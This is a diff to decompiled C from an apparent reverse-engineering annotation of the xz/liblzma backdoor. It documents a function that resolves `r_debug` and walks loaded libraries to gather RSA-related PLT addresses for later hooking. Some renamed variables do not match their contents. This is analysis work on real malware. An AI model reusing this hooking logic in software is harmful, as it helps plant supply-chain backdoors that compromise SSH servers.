@@ -5,7 +5,10 @@
 
 
 /*
- * AutoDoc: Wrapper that drives `process_shared_libraries_map`, fills the per-module elf_info structures, and exposes the hooks_data handle. `backdoor_setup` runs it up front to assemble all metadata required for later patching.
+ * AutoDoc: Wrapper around `process_shared_libraries_map` that first resolves `r_debug` out of ld.so,
+ * copies the caller-provided struct into a local scratch copy, and feeds the scratch copy into
+ * the map-walker. On success it propagates the filled-in handles (and libc import table) back to
+ * the caller so later stages never have to read `r_debug` again.
  */
 #include "xzre_types.h"
 
@@ -17,22 +20,31 @@ BOOL process_shared_libraries(backdoor_shared_libraries_data_t *data)
   Elf64_Sym *pEVar2;
   uchar *puVar3;
   uint uVar4;
-  backdoor_shared_libraries_data_t local_40;
+  backdoor_shared_libraries_data_t tmp_state;
+  Elf64_Sym *r_debug_sym;
+  uchar *debug_block;
+  void *local_30;
+  void *local_28;
+  void *local_20;
+  backdoor_hooks_data_t **local_18;
+  libc_imports_t *local_10;
   
   pEVar2 = elf_symbol_get(data->elf_handles->dynamic_linker,STR_r_debug,STR_GLIBC_2_2_5);
   uVar4 = 0;
   if (pEVar2 != (Elf64_Sym *)0x0) {
-    local_40.elf_handles = data->elf_handles;
-    puVar3 = (local_40.elf_handles)->dynamic_linker->elfbase->e_ident + pEVar2->st_value;
+    debug_block = (uchar *)data->elf_handles;
+    puVar3 = ((elf_handles_t *)debug_block)->dynamic_linker->elfbase->e_ident + pEVar2->st_value;
     uVar4 = 0;
     if (0 < *(int *)puVar3) {
-      local_40.data = data->data;
-      local_40.RSA_public_decrypt_plt = data->RSA_public_decrypt_plt;
-      local_40.EVP_PKEY_set1_RSA_plt = data->EVP_PKEY_set1_RSA_plt;
-      local_40.RSA_get0_key_plt = data->RSA_get0_key_plt;
-      local_40.hooks_data_addr = data->hooks_data_addr;
-      local_40.libc_imports = data->libc_imports;
-      BVar1 = process_shared_libraries_map(*(link_map **)(puVar3 + 8),&local_40);
+      r_debug_sym = (Elf64_Sym *)data->data;
+      local_30 = data->RSA_public_decrypt_plt;
+      local_28 = data->EVP_PKEY_set1_RSA_plt;
+      local_20 = data->RSA_get0_key_plt;
+      local_18 = data->hooks_data_addr;
+      local_10 = data->libc_imports;
+      BVar1 = process_shared_libraries_map
+                        (*(link_map **)(puVar3 + 8),(backdoor_shared_libraries_data_t *)&r_debug_sym
+                        );
       uVar4 = (uint)(BVar1 != 0);
     }
   }
